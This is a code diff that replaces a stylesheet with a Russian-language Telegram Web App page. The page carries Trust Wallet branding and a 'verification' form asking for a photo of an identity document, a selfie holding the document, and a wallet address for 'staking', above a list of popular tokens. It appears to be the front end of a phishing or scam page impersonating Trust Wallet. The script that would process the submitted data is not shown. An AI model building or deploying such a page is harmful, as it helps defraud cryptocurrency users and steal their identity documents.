@@ -1,264 +1,73 @@
-:root {
-    --tw-blue: #3375BB;
-    --tw-bg: #FFFFFF;
-    --tw-secondary-bg: #F5F7F9;
-    --tw-text: #1E2329;
-    --tw-hint: #707A8A;
-    --tw-border: #EAECEF;
-}
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Trust Verification</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" 
+                 alt="Trust Wallet Logo" 
+                 class="logo">
+            <h1>Верификация</h1>
+        </div>
+        
+        <!-- Секция Верификации -->
+        <div class="card">
+            <div class="input-group">
+                <label class="label">Документ, подтверждающий личность</label>
+                <div class="file-upload-wrapper">
+                    <input type="file" id="docInput" accept="image/*">
+                    <div class="file-custom">📄 Выбрать фото документа</div>
+                </div>
+            </div>
 
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-}
+            <div class="input-group">
+                <label class="label">Селфи с документом</label>
+                <div class="file-upload-wrapper">
+                    <input type="file" id="selfieInput" accept="image/*">
+                    <div class="file-custom">🤳 Сделать селфи</div>
+                </div>
+            </div>
 
-body {
-    font-family: 'Inter', -apple-system, sans-serif;
-    background-color: var(--tw-bg);
-    color: var(--tw-text);
-    line-height: 1.5;
-}
+            <button id="verifyBtn" class="btn btn-primary">Подтвердить личность</button>
+        </div>
 
-.app-container {
-    padding: 20px;
-    max-width: 450px;
-    margin: 0 auto;
-}
+        <!-- Секция Стейкинга -->
+        <div class="card">
+            <h3>Стейкинг</h3>
+            <p class="hint">Введите адрес кошелька для подключения</p>
+            <div class="input-group">
+                <input type="text" id="walletInput" placeholder="Адрес кошелька (0x...)" class="text-input">
+            </div>
+            <button id="stakingBtn" class="btn btn-outline">Подключить стейкинг</button>
+        </div>
 
-.header {
-    text-align: center;
-    margin-bottom: 30px;
-}
+        <!-- Популярные токены -->
+        <div class="card tokens-card">
+            <h2 class="tokens-title">Популярные токены</h2>
 
-.logo {
-    height: 40px;
-    margin-bottom: 10px;
-}
+            <div class="tokens-tabs">
+                <button class="token-tab active">Top</button>
+                <button class="token-tab">BNB</button>
+                <button class="token-tab">ETH</button>
+                <button class="token-tab">SOL</button>
+            </div>
 
-h1 {
-    font-size: 22px;
-    font-weight: 700;
-}
+            <p class="tokens-subtitle">Топ-5 токенов по общей рыночной капитализации</p>
 
-h3 {
-    font-size: 18px;
-    margin-bottom: 8px;
-}
+            <div id="tokensList" class="tokens-list">
+                <div class="loading-text">Загрузка...</div>
+            </div>
+        </div>
 
-.card {
-    background: var(--tw-secondary-bg);
-    border-radius: 16px;
-    padding: 20px;
-    margin-bottom: 20px;
-    border: 1px solid var(--tw-border);
-}
+        <div id="status" class="status-toast hidden"></div>
+    </div>
 
-.label {
-    display: block;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 8px;
-    color: var(--tw-text);
-}
-
-.hint {
-    font-size: 13px;
-    color: var(--tw-hint);
-    margin-bottom: 15px;
-}
-
-.input-group {
-    margin-bottom: 20px;
-}
-
-/* Стилизация загрузки файлов */
-.file-upload-wrapper {
-    position: relative;
-    overflow: hidden;
-    display: inline-block;
-    width: 100%;
-}
-
-.file-upload-wrapper input[type=file] {
-    font-size: 100px;
-    position: absolute;
-    left: 0;
-    top: 0;
-    opacity: 0;
-    cursor: pointer;
-}
-
-.file-custom {
-    background: #fff;
-    border: 1px solid var(--tw-border);
-    padding: 12px;
-    border-radius: 10px;
-    text-align: center;
-    color: var(--tw-blue);
-    font-weight: 500;
-    font-size: 14px;
-}
-
-.text-input {
-    width: 100%;
-    padding: 14px;
-    border-radius: 12px;
-    border: 1px solid var(--tw-border);
-    font-size: 16px;
-    outline: none;
-}
-
-.text-input:focus {
-    border-color: var(--tw-blue);
-}
-
-.btn {
-    width: 100%;
-    padding: 16px;
-    border-radius: 25px;
-    font-size: 16px;
-    font-weight: 700;
-    border: none;
-    cursor: pointer;
-    transition: transform 0.1s;
-}
-
-.btn:active {
-    transform: scale(0.98);
-}
-
-.btn-primary {
-    background-color: var(--tw-blue);
-    color: white;
-}
-
-.btn-outline {
-    background-color: transparent;
-    border: 2px solid var(--tw-blue);
-    color: var(--tw-blue);
-}
-
-.status-toast {
-    position: fixed;
-    bottom: 30px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #333;
-    color: white;
-    padding: 12px 24px;
-    border-radius: 30px;
-    font-size: 14px;
-    z-index: 1000;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-}
-
-.hidden { display: none; }
-.tokens-card {
-    padding-top: 18px;
-}
-
-.tokens-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-}
-
-.tokens-tabs {
-    display: flex;
-    gap: 12px;
-    margin-bottom: 12px;
-    border-bottom: 1px solid var(--tw-border);
-    padding-bottom: 4px;
-}
-
-.token-tab {
-    background: none;
-    border: none;
-    padding: 6px 0;
-    font-size: 13px;
-    font-weight: 600;
-    color: var(--tw-hint);
-    position: relative;
-    cursor: default;
-}
-
-.token-tab.active {
-    color: var(--tw-blue);
-}
-
-.token-tab.active::after {
-    content: "";
-    position: absolute;
-    left: 0;
-    right: 0;
-    bottom: -5px;
-    height: 2px;
-    border-radius: 999px;
-    background: var(--tw-blue);
-}
-
-.tokens-list {
-    margin-top: 8px;
-}
-
-.token-row {
-    display: grid;
-    grid-template-columns: auto 1fr auto;
-    align-items: center;
-    gap: 12px;
-    padding: 8px 0;
-}
-
-.token-left {
-    font-size: 13px;
-    color: var(--tw-hint);
-}
-
-.token-rank {
-    width: 18px;
-}
-
-.token-main {
-    display: flex;
-    flex-direction: column;
-}
-
-.token-name-line {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-}
-
-.token-symbol {
-    font-size: 12px;
-    color: var(--tw-hint);
-}
-
-.token-price {
-    text-align: right;
-    font-weight: 600;
-    font-size: 14px;
-}
-
-.token-change {
-    text-align: right;
-    font-size: 11px;
-    margin-top: 2px;
-}
-
-.token-change.negative {
-    color: #E53935;
-}
-
-.token-change.positive {
-    color: #43A047;
-}
-
-.token-meta {
-    font-size: 11px;
-    color: var(--tw-hint);
-    margin-top: 2px;
-}
+    <script src="script.js"></script>
+</body>
+</html>
